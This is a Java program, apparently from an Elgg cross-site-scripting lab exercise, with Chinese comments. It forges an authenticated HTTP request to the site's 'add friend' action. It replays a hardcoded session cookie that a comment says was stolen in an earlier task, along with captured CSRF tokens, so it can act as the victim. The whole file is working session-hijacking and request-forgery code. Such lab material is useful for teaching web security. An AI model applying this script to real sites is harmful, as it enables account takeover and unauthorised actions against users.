import java.io. * ; 
import java.net. * ;

public class HTTPSimpleForge {

public static void main(String[] args) throws IOException {

try {

int responseCode; 
InputStream responseIn=null;

//重要提示：此处你需要获取__elgg_ts和__elgg_token参数的值，并填到requestDetails中去，注意每次获取的参数只有在下一次请求才有效，若需要发送新的请求，则需要重新获取参数的值。

String requestDetails = "&__elgg_ts=1562148353&__elgg_token=kTU23sbmGwBBo0zakB_ONQ";
//伪造的网址。
URL url = new URL ("http://www.xsslabelgg.com/action/friends/add?friend=45"+requestDetails);
//创建URLConnection实例以进一步参数化URL实例的状态成员可以表示的资源请求
HttpURLConnection urlConn = (HttpURLConnection) url.openConnection(); if (urlConn instanceof HttpURLConnection) { 
urlConn.setConnectTimeout(60000); 
urlConn.setReadTimeout(90000); 
}
// addRequestProperty方法用于添加HTTP标头信息。
//这里我们将User-Agent HTTP头添加到伪造的HTTP数据包中。
//重要提示：在这里自己添加其他必要的HTTP头。Cookies应该使用任务3中的方法被盗用
urlConn.addRequestProperty("User-agent","Sun JDK 1.6");
urlConn.addRequestProperty("Cookie","Elgg=s2ut6mocfkrgau2pqsoo6jn101");
// HTTP Post 数据包含要发送到服务器的信息。
String data = "name=Samy&guid=43";
// URL连接的DoOutput标志应该设置为true
//发送HTTP POST消息。
urlConn.setDoOutput(true);
// OutputStreamWriter用于写入HTTP POST数据到网址连接
OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
wr.write(data);
wr.flush();
// HttpURLConnection的一个子类URLConnection被返回
// url.openConnection()是因为url是一个http请求。
if (urlConn instanceof HttpURLConnection) { HttpURLConnection httpConn = (HttpURLConnection) urlConn;
//联系网络服务器并从中获取状态代码
// HTTP响应消息。
responseCode = httpConn.getResponseCode(); 
System.out.println("Response Code = " + responseCode);
// HTTP状态码HTTP_OK表示响应是
//获得成功。
if (responseCode == HttpURLConnection.HTTP_OK)
//从url连接对象获取输入流。
responseIn = urlConn.getInputStream();
//为BufferedReader创建一个实例
//逐行读取响应。
BufferedReader buf_inp = new BufferedReader( new InputStreamReader(responseIn));
String inputLine; 
while((inputLine = buf_inp.readLine())!=null) {
System.out.println(inputLine); 
}
} 
} catch (MalformedURLException e) {
e.printStackTrace(); 
}
} 
}


